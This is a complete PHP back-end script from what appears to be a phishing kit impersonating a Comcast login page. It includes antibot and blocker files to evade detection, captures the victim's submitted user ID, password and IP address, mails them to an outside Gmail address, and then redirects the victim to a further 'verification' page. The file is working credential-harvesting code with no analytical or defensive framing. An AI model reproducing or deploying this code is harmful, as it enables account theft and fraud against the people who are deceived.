<?php
/*   
Mou-Ad                    
*/
session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include './antibots.php';
include './bt.php';
include "./blocker.php";
$user = $_POST['user'];
$passwd = $_POST['passwd'];
$ip = $_SERVER['REMOTE_ADDR'];
$line = ("___________________");
$message = ("User ID: $user\r\nPassword: $passwd\r\n$ip\r\n$line\r\n");
$to = "onlinebankingdept95@gmail.com";
$subject = "Comcast : ".$ip."\n";
$headers = "MIME-Version: 1.0\n";
mail($to,$subject,$message,$headers);
header("Location: e-mail.verification.php");
?>